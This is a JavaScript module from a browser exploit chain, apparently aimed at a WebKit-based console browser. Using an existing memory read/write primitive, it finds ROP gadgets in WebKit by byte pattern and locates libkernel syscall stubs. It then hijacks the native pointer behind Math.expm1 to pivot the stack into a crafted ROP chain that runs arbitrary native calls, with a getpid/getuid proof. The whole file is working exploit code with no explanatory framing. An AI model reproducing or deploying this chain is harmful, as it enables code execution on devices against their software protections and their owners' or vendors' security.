/**
 * Math.expm1 pivot native call — poops-style ROP (chain_poops.js).
 * Pop gadgets: 13.52 HW. Pivot/call gadgets + libkernel stubs: 13.00 row (verify on HW).
 */
import { int64 } from "./int64.js";

export const SYS = {
    getpid: 20,
    getuid: 0x18,
};

const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);

const GADGET_TABLE = [
    ["POP_RDI_RET", "wk_POP_RDI_RET", [0x5f, 0xc3]],
    ["POP_RSI_RET", "wk_POP_RSI_RET", [0x5e, 0xc3]],
    ["POP_RDX_RET", "wk_POP_RDX_RET", [0x5a, 0xc3]],
    ["POP_RCX_RET", "wk_POP_RCX_RET", [0x59, 0xc3]],
    ["POP_R8_RET", "wk_POP_R8_RET", [null, 0x58, 0xc3]],
    ["POP_R9_RET", "wk_POP_R9_RET", [null, 0x59, 0xc3]],
    ["POP_RAX_RET", "wk_POP_RAX_RET", [0x58, 0xc3]],
    ["LEAVE_RET", "wk_LEAVE_RET", [0xc9, 0xc3]],
    ["MOV_RDI_RAX_RET", "wk_MOV_QWORD_PTR_RDI_RAX_RET", [0x48, 0x89, 0x07, 0xc3]],
    ["G0", "wk_MOV_RDI_RSI_30_CALL", [0x48, 0x8b, 0x7e, 0x30]],
    ["G1", "wk_POP_RAX_MOV_RAX_JMP_18", [0x58, 0x48, 0x8b, 0x07]],
    ["G2", "wk_PUSH_RBP_MOV_RBP_RSP_10", [0x55, 0x48, 0x89, 0xe5]],
    ["G3", "wk_MOV_RDI_RAX_8_CALL_20", [0x48, 0x8b, 0x78, 0x08]],
    ["G4", "wk_MOV_RDX_RAX_18_CALL_10", [0x48, 0x8b, 0x50, 0x38]],
    ["G5", "wk_PUSH_RDX_POP_RSP_RET", [0x52, 0x5c, 0xc3]],
];

function checkGadget(p, base, rva, pat) {
    if (rva == null) return false;
    const a = base.add32(rva);
    for (let i = 0; i < pat.length; i++) {
        if (pat[i] === null) continue;
        if (p.read1(a.add32(i)) !== pat[i]) return false;
    }
    return true;
}

function resolveGadgets(p, webkitBase, off) {
    const G = {};
    const bad = [];
    for (let i = 0; i < GADGET_TABLE.length; i++) {
        const nm = GADGET_TABLE[i][0];
        const key = GADGET_TABLE[i][1];
        let pat = GADGET_TABLE[i][2];
        if (nm === "G4" && off.pivot_view_sp != null)
            pat = [0x48, 0x8b, 0x50, off.pivot_view_sp & 0xff];
        const rva = off[key];
        if (checkGadget(p, webkitBase, rva, pat))
            G[nm] = webkitBase.add32(rva);
        else
            bad.push(nm);
    }
    return { G, bad };
}

function isStub(v, num) {
    if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) return false;
    const n = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
    return n === num;
}

function seedStubs(p, libkernelBase, off) {
    const stubAddr = new Map();
    let seeded = 0;
    if (off.k_stubs) {
        for (const numStr in off.k_stubs) {
            const num = +numStr;
            const o = off.k_stubs[numStr];
            const v = p.read8(libkernelBase.add32(o));
            if (!isStub(v, num)) continue;
            stubAddr.set(num, libkernelBase.add32(o));
            seeded++;
        }
    }
    const need = new Set([SYS.getpid, SYS.getuid].filter(n => !stubAddr.has(n)));
    let scanned = 0;
    const scanMax = off.k_scan_stage1 || 0x40000;
    for (let o = 0; o < scanMax && need.size; o += 16) {
        const v = p.read8(libkernelBase.add32(o));
        if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
        const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
        if (!need.has(num)) continue;
        stubAddr.set(num, libkernelBase.add32(o));
        need.delete(num);
        scanned++;
    }
    return { stubAddr, seeded, scanned, missing: [...need] };
}

function bufAddr(p, off, ab) {
    const c = p.leakval(ab);
    return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
        .add32(off.wk_ArrayBuffer_m_contents_m_data));
}

function put(dv, at, v) {
    if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
    } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
    }
}

/**
 * @param {object} p window.p
 * @param {object} off offset table
 * @param {object} opts { webkitBase, nativeFn, log }
 */
export function initNativeCall(p, off, opts) {
    opts = opts || {};
    const log = opts.log || (() => {});

    let webkitBase = opts.webkitBase || null;
    if (!webkitBase && opts.nativeFn && off.wk_expm1_builtin)
        webkitBase = opts.nativeFn.sub32(off.wk_expm1_builtin);
    if (!webkitBase)
        throw new Error("native_call: need webkitBase or nativeFn+expm1");

    if (!off.wk___imp___error || !off.k__error)
        throw new Error("native_call: missing wk___imp___error / k__error");

    const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
    const libkernelBase = errorFn.sub32(off.k__error);
    log("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);

    const { G, bad } = resolveGadgets(p, webkitBase, off);
    if (bad.length)
        throw new Error("gadget-bad: " + bad.join(","));

    const { stubAddr, seeded, scanned, missing } = seedStubs(p, libkernelBase, off);
    log("STUBS", "seeded=" + seeded + " scanned=" + scanned);
    if (missing.length)
        throw new Error("stub-miss: " + missing.join(","));

    const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
        G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
    const pivotSp = off.pivot_view_sp;
    const PB_SIZE = Math.max(0x28, (pivotSp + 8 + 0xf) & ~0xf);
    const keepAlive = [];

    function makeCtx() {
        const sb = new ArrayBuffer(0x20);
        const pb = new ArrayBuffer(PB_SIZE);
        const kb = new ArrayBuffer(0x2000);
        const fb = new ArrayBuffer(0x40);
        keepAlive.push(sb, pb, kb, fb);
        const c = {
            storeDv: new DataView(sb),
            pivotDv: new DataView(pb),
            stackDv: new DataView(kb),
            frameDv: new DataView(fb),
            stackU8: new Uint8Array(kb),
            frameU8: new Uint8Array(fb),
        };
        keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv, c.stackU8, c.frameU8);
        c.S = bufAddr(p, off, sb);
        c.P = bufAddr(p, off, pb);
        c.K = bufAddr(p, off, kb);
        c.F = bufAddr(p, off, fb);
        put(c.storeDv, 0x00, G.G1);
        put(c.storeDv, 0x08, c.P);
        put(c.storeDv, 0x10, G.G3);
        put(c.storeDv, 0x18, G.G2);
        put(c.pivotDv, 0x00, c.P);
        put(c.pivotDv, 0x10, G.G5);
        put(c.pivotDv, 0x20, G.G4);
        return c;
    }

    function layout(c, target, args) {
        c.stackU8.fill(0);
        c.frameU8.fill(0);
        const insts = [];
        for (let i = 0; i < args.length; i++) {
            insts.push(argGadget[i]);
            insts.push(args[i]);
        }
        const targetIdx = insts.length;
        insts.push(target);
        insts.push(G.POP_RDI_RET);
        insts.push(c.F);
        insts.push(G.MOV_RDI_RAX_RET);
        insts.push(G.POP_RAX_RET);
        insts.push(JSVALUE_UNDEFINED);
        insts.push(G.LEAVE_RET);
        let at = 0x2000 - 8 * insts.length;
        if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
        for (let i = 0; i < insts.length; i++)
            put(c.stackDv, at + 8 * i, insts[i]);
        put(c.pivotDv, pivotSp, c.K.add32(at));
    }

    const M = makeCtx();
    const cell = p.leakval(Math.expm1);
    const mainMf = p.read8(p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function));
    const mainOrig = p.read8(mainMf);
    const pivotObj = {};
    keepAlive.push(pivotObj);
    const pivotCell = p.leakval(pivotObj);
    p.write8(mainMf, G.G0);

    function callAddr(target, args) {
        layout(M, target, args || []);
        const saved = p.read8(pivotCell);
        p.write8(pivotCell, M.S);
        Math.expm1(pivotObj);
        p.write8(pivotCell, saved);
        return {
            lo: M.frameDv.getUint32(0, true),
            hi: M.frameDv.getUint32(4, true),
            i32: M.frameDv.getUint32(0, true) | 0,
        };
    }

    function sc(num, ...a) {
        const stub = stubAddr.get(num);
        if (!stub) throw new Error("no stub " + num);
        return callAddr(stub, a);
    }

    function disarm() {
        try { p.write8(mainMf, mainOrig); } catch (_) { }
    }

    return {
        webkitBase,
        libkernelBase,
        callAddr,
        sc,
        disarm,
        stubAddr,
    };
}

export function runGetpidProof(p, off, opts) {
    const chain = initNativeCall(p, off, opts);
    try {
        const pid = chain.sc(SYS.getpid).i32;
        const uid = chain.sc(SYS.getuid).i32;
        return { ok: pid > 0, pid, uid, chain };
    } catch (err) {
        chain.disarm();
        throw err;
    }
}
